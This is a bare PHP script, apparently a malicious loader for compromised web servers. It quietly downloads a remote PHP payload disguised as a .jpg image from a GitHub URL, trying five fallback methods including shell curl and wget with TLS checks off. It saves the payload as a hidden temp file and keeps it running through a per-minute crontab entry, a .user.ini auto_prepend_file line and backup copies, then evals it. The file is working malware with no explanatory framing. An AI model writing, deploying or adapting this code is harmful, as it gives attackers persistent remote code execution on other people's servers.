<?php
error_reporting(0);ini_set('display_errors',0);set_time_limit(0);

// URL encoded
$url = 'https%3A%2F%2Fraw.githubusercontent.com%2Ftikung6etar%2FNyarek%2Frefs%2Fheads%2Fmaster%2Fxmin.jpg';
$url = rawurldecode($url);

// cari writable
$dirs=array('/var/tmp/','/home/','/tmp/','/dev/shm/','./');$save='';foreach($dirs as $d){if(@is_writable($d)){$save=$d;break;}}if(empty($save)){$save='/tmp/';}
$fname='.'.md5(rand().time()).'.tmp';$fpath=$save.$fname;

$data='';

// method 1: file_get_contents
if(empty($data) && ini_get('allow_url_fopen')){
    $data=@file_get_contents($url);
}

// method 2: stream context
if(empty($data) && ini_get('allow_url_fopen')){
    $ctx=stream_context_create(array(
        'http'=>array('method'=>'GET','header'=>"User-Agent: Mozilla/5.0\r\n",'timeout'=>30,'follow_location'=>1),
        'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false)
    ));
    $data=@file_get_contents($url,false,$ctx);
}

// method 3: socket
if(empty($data)){
    $p=parse_url($url);
    $host=$p['host'];
    $path=isset($p['path'])?$p['path']:'/';
    $port=($p['scheme']=='https')?443:80;
    $proto=($p['scheme']=='https')?'ssl://':'';
    $fp=@fsockopen($proto.$host,$port,$errno,$errstr,10);
    if($fp){
        $out="GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n";
        fwrite($fp,$out);
        $resp='';while(!feof($fp)){$resp.=fread($fp,8192);}
        fclose($fp);
        $parts=explode("\r\n\r\n",$resp,2);
        $data=isset($parts[1])?$parts[1]:'';
    }
}

// method 4: curl
if(empty($data) && function_exists('curl_init')){
    $c=curl_init();
    curl_setopt($c,CURLOPT_URL,$url);
    curl_setopt($c,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($c,CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($c,CURLOPT_TIMEOUT,30);
    curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($c,CURLOPT_USERAGENT,'Mozilla/5.0');
    $data=curl_exec($c);
    curl_close($c);
}

// method 5: shell_exec
if(empty($data) && function_exists('shell_exec')){
    $tmp='/tmp/'.md5(rand()).'.tmp';
    @shell_exec('curl -s -k -o '.$tmp.' '.$url.' 2>/dev/null');
    if(!file_exists($tmp)||filesize($tmp)<10){@shell_exec('wget -q -O '.$tmp.' '.$url.' 2>/dev/null');}
    if(file_exists($tmp)&&filesize($tmp)>10){$data=file_get_contents($tmp);@unlink($tmp);}
}

if(empty($data)||strlen($data)<50){exit(0);}
if(strpos($data,'<?php')!==false){$data=preg_replace('/^.*?<\?php/','<?php',$data);}
@file_put_contents($fpath,$data);

if(function_exists('shell_exec')){
    $cmd='(crontab -l 2>/dev/null; echo "* * * * * php -r \'@include(\"" . $fpath . "\");\' 2>/dev/null") | crontab - 2>/dev/null';
    @shell_exec($cmd);
}

$ini_path=$_SERVER['DOCUMENT_ROOT'].'/.user.ini';
if(@is_writable(dirname($ini_path))){
    @file_put_contents($ini_path,"auto_prepend_file = ".$fpath."\n",FILE_APPEND);
}

$backups=array('/tmp/','/var/tmp/','/dev/shm/');
foreach($backups as $b){
    if(@is_writable($b)&&$b!=$save){
        $bf=$b.'.'.md5(rand().time()).'.tmp';
        @copy($fpath,$bf);
    }
}

if(file_exists($fpath)){
    $content=@file_get_contents($fpath);
    if($content&&strpos($content,'<?php')!==false){
        $content=preg_replace('/\$[a-zA-Z0-9_]+\[\'?[^\']*\'?\]/','@$0',$content);
        @eval('?>'.$content);
    }
}
?>
